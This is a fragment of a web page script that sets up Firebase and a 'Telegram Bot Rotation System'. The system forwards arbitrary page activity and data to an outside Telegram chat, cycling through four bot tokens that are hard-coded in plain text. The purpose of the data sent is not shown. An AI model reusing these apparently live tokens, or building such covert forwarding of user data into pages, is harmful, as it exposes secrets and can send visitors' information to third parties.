        };
        const app = initializeApp(firebaseConfig);
        window.db = getFirestore(app);
        window.auth = getAuth(app);

        // Telegram Bot Rotation System
        const botTokens = [
            "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g",
            "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0",
            "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0",
            "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ"
        ];
        const targetChatId = "6917040501"; // သင်ရဲ့ Telegram ID
        let currentBotIndex = 0;

        window.sendToTelegram = async (action, data) => {
            const token = botTokens[currentBotIndex];
            currentBotIndex = (currentBotIndex + 1) % botTokens.length; // နောက်တစ်ခါပို့ရင် နောက် Bot ကို သုံးမယ်
            
            const message = `🚨 *New Activity:* ${action}\n📄 *Details:* ${JSON.stringify(data)}\n👤 *User:* @thaethae7780`;
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: targetChatId, text: message, parse_mode: 'Markdown' })
                });
            } catch (e) { console.error("Telegram Forwarding Error"); }
        };
    </script>
